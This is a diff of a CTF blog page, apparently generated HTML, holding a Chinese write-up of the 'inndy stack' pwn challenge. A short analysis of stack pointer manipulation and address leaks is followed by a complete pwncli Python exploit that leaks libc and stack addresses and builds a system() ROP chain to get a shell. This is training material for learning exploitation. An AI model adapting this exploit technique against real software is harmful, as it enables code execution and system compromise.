@@ -23,11 +23,11 @@
 <meta property="og:site_name" content="W4y2Sh3ll">
 <meta property="og:description" content="分析  32位,保护全开    实现了一个简单的栈    pop    push  思路 v6[0]是当前栈指针（esp），可以通过pop向后移动再push修改使其指向ret addr 可以通过pop泄露程序地址、栈地址和libc地址 泄露libc地址后ROP  Exp12345678910111213141516171819202122232425262728293031323334353637">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://www.w4y2sh3ll.top/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng">
-<meta property="og:image" content="https://www.w4y2sh3ll.top/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng">
-<meta property="og:image" content="https://www.w4y2sh3ll.top/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng">
-<meta property="og:image" content="https://www.w4y2sh3ll.top/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng">
-<meta property="og:image" content="https://www.w4y2sh3ll.top/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng">
+<meta property="og:image" content="https://www.w4y2sh3ll.top/2022/12/10/inndy-stack/1.png">
+<meta property="og:image" content="https://www.w4y2sh3ll.top/2022/12/10/inndy-stack/2.png">
+<meta property="og:image" content="https://www.w4y2sh3ll.top/2022/12/10/inndy-stack/3.png">
+<meta property="og:image" content="https://www.w4y2sh3ll.top/2022/12/10/inndy-stack/4.png">
+<meta property="og:image" content="https://www.w4y2sh3ll.top/2022/12/10/inndy-stack/5.png">
 <meta property="article:published_time" content="2022-12-10T05:39:25.000Z">
 <meta property="article:modified_time" content="2022-12-11T07:35:30.896Z">
 <meta property="article:author" content="W4y2Sh3ll">
@@ -36,7 +36,7 @@
 <meta property="article:tag" content="BUU">
 <meta property="article:tag" content="PWN">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://www.w4y2sh3ll.top/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng">
+<meta name="twitter:image" content="https://www.w4y2sh3ll.top/2022/12/10/inndy-stack/1.png">
   
   
   
@@ -294,19 +294,19 @@
             
               <div class="markdown-body">
                 
-                <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng" srcset="/img/loading.gif" lazyload></p>
+                <h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="/2022/12/10/inndy-stack/1.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>32位,保护全开</li>
 </ul>
-<p><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/12/10/inndy-stack/2.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>实现了一个简单的栈</li>
 </ul>
-<p><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/12/10/inndy-stack/3.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>pop</li>
 </ul>
-<p><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/12/10/inndy-stack/4.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
 <li>push</li>
 </ul>
@@ -317,7 +317,7 @@
 </ul>
 <h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># Date: 2022-12-08 14:20:13</span><br><span class="hljs-comment"># Link: https://github.com/RoderickChan/pwncli</span><br><span class="hljs-comment"># Usage:</span><br><span class="hljs-comment">#     Debug : python3 exp.py debug elf-file-path -t -b malloc</span><br><span class="hljs-comment">#     Remote: python3 exp.py remote elf-file-path ip:port</span><br><br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br>cli_script()<br><br><br>io: tube = gift.io<br>elf: ELF = gift.elf<br>libc: ELF = gift.libc<br><br><span class="hljs-comment"># one_gadgets: list = get_current_one_gadget_from_libc(more=False)</span><br>CurrentGadgets.set_find_area(find_in_elf=<span class="hljs-literal">True</span>, find_in_libc=<span class="hljs-literal">False</span>, do_initial=<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cmd</span>(<span class="hljs-params">i, prompt=<span class="hljs-string">&quot;Cmd &gt;&gt;\n&quot;</span></span>):<br>    sla(prompt, i)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>():<br>    cmd(<span class="hljs-string">&#x27;p&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">d</span>):<br>    cmd(<span class="hljs-string">&#x27;i&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(d))<br><br>pop()<br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br><br>libc=ELF(<span class="hljs-string">&quot;../libc/libc-2.23_32.so&quot;</span>)<br><span class="hljs-comment"># libc_base-=0x1D5B73</span><br><br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>elf_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>elf_base-=<span class="hljs-number">0x75a</span><br>pop()<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>stack=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    push(<span class="hljs-number">0x59</span>)<br>pop()<br>ru(<span class="hljs-string">&quot;Pop -&gt; &quot;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&quot;\n&quot;</span>,drop=<span class="hljs-literal">True</span>))<br>libc_base-=<span class="hljs-number">0x18637</span><br>one=libc_base+<span class="hljs-number">0x3a80c</span><br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(<span class="hljs-number">16</span>)<br>push(system)<br>push(stack+<span class="hljs-number">0x78</span>)<br>push(libc_base+<span class="hljs-number">0x0015902b</span>)<br>cmd(<span class="hljs-string">&quot;x&quot;</span>)<br><span class="hljs-built_in">print</span>(libc_base)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(elf_base))<br>ia()<br><br></code></pre></td></tr></table></figure>
 
-<p><img src="/2024/04/19/2-SPIFF-%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/ng" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2022/12/10/inndy-stack/5.png" srcset="/img/loading.gif" lazyload></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
                 
               </div>
@@ -428,9 +428,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/01/02/NepNep-Catctf-wp/" title="NepNep_Catctf_wp">
+                      <a href="/2023/01/12/HGAME-2023-Week1-Wp/" title="HGAME_2023_Week1_Wp">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">NepNep_Catctf_wp</span>
+                        <span class="hidden-mobile">HGAME_2023_Week1_Wp</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
